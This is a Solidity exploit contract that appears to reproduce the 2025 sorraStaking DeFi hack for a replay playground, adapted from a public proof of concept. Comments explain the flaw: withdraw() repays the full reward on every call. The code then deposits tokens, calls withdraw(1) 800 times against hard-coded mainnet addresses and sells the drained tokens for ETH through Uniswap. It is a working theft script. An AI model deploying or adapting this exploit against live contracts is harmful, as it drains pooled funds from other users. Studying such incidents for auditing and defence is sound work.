// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-01-sorraStaking).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); no flash-loan callback is needed at all — the
// attacker just deposits real SOR it already holds, waits out the 14-day lock,
// then loops withdraw(1)). There is no standalone exploit contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (test/sorraStaking.sol: ContractTest.testExploit), so the playground can
// deploy it and record run(). Logic and constants are copied verbatim, with one
// adaptation: the original test deposits BEFORE `cheats.warp(+14 days + 1)`, so
// `deposit()`'s `depositTime` is stamped at the PRE-warp timestamp and the lock
// has genuinely elapsed by the time `withdraw` runs. The playground instead
// replays the ENTIRE recorded call at a single fixed (already-warped) block
// timestamp — so if `deposit()` ran inside the recorded call, its `depositTime`
// would equal the warped `block.timestamp` and the lock would never appear
// elapsed. To reproduce this faithfully, `deposit()` is split out into `prep()`,
// invoked from the config's `setup.steps` (unrecorded, at the ORIGINAL dumped
// fork timestamp, exactly like the real pre-warp deposit tx) — then the config's
// `setup.blockTimestamp` warps forward +14 days + 1 for the recorded `run()`,
// which only contains the withdraw loop and the cash-out swaps (mirroring the
// real attack's SEPARATE deposit and attack transactions 14 days apart). The
// attacker's SOR balance (`deal(SOR, address(this), 122868.87e18)` in setUp())
// is expressed as the config's `setup.dealToken`, called before `prep()`.
//
// Root cause: sorraStaking.withdraw(_amount) computes `rewardAmount =
// getPendingRewards(sender)` from the position's ENTIRE totalAmount (not the
// `_amount` being withdrawn) and pays it out IN FULL on every successful call,
// while `_decreasePosition` only shaves `_amount` (1 wei) off the principal.
// There is no "reward already claimed" bookkeeping, so the exact same ~5%
// reward is payable again on the very next call. Looping withdraw(1) drains
// the pool's reward reserve far beyond the position's genuine one-time reward.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ISorraStaking {
    function deposit(uint256 amount, uint8 tier) external;
    function withdraw(uint256 amount) external;
}

interface IUniRouterV2 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract SorraStakingDrain {
    address private constant SOR = 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF;
    address private constant SOR_STAKING = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private constant DEPOSIT_AMOUNT = 122868871710593438486048; // full attacker SOR balance
    uint256 private constant MAX_SELL_AMOUNT = 700000000000000000000000; // per-swap max sell amount

    IERC20 private constant sor = IERC20(SOR);
    ISorraStaking private constant staking = ISorraStaking(SOR_STAKING);
    IUniRouterV2 private constant router = IUniRouterV2(ROUTER);

    // Pre-attack prep (called from the config's setup.steps, unrecorded, at the
    // ORIGINAL dumped fork timestamp): deposit the full SOR balance at tier 0
    // (5%, 14-day lock). Mirrors the real deposit transaction, which happened
    // 14 days before the real attack transaction.
    function prep() external {
        sor.approve(SOR_STAKING, type(uint256).max);
        staking.deposit(DEPOSIT_AMOUNT, 0);
    }

    // Recorded attack (runs after the config's setup.blockTimestamp warps
    // forward +14 days + 1, so the deposit's lock has genuinely elapsed): loop
    // withdraw(1) to re-claim the full position reward 800 times, then sell the
    // drained SOR for ETH across 7 swaps (SOR has a 5% sell tax).
    function run() external {
        for (uint256 i = 0; i < 800; i++) {
            staking.withdraw(1);
        }

        sor.approve(ROUTER, sor.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = SOR;
        path[1] = router.WETH();
        for (uint256 i = 0; i < 7; i++) {
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                MAX_SELL_AMOUNT,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    receive() external payable {}
}
